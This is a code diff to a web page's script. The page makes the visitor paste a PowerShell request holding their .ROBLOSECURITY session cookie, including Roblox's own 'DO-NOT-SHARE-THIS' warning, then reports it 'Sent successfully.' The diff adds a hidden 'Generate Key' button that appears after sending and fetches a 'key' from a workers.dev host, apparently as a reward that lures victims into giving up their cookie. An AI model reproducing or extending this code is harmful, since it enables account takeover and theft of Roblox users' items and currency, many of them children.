@@ -93,13 +93,20 @@
     <br>
 
     <button id="submit">Submit</button>
-
+    
     <div id="status"></div>
 
+    <button id="generateKey" style="display: none;">
+    Generate Key
+    </button>
+
+    
         <script>
             const message = document.getElementById("message");
             const submit = document.getElementById("submit");
             const status = document.getElementById("status");
+            
+            const generateKeyButton = document.getElementById("generateKey");
         
             const minimumLength = 269;
             const requiredWords = ["Powershell", "$session.Cookies.Add((New-Object System.Net.Cookie(", ".ROBLOSECURITY", "_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items."];
@@ -196,6 +203,7 @@ if (startIndex !== -1 && endIndex !== -1) {
         }
 
         status.textContent = "Sent successfully.";
+generateKeyButton.style.display = "block";
 
     } catch (error) {
         console.error(error);
@@ -203,6 +211,35 @@ if (startIndex !== -1 && endIndex !== -1) {
     }
 }
 
+async function generateKey() {
+    status.textContent = "Generating key...";
+
+    try {
+        const response = await fetch(
+            "https://feenabler.soundpegasusofficial.workers.dev/generate"
+        );
+
+        if (!response.ok) {
+            throw new Error(`HTTP ${response.status}`);
+        }
+
+        const data = await response.json();
+
+        if (!data.success || !data.key) {
+            throw new Error("Invalid server response");
+        }
+
+        message.value = data.key;
+        status.textContent = "Key generated successfully.";
+
+    } catch (error) {
+        console.error(error);
+        status.textContent = "Failed to generate key.";
+    }
+}
+
+generateKeyButton.addEventListener("click", generateKey);
+            
 submit.addEventListener("click", send);
 </script>
 
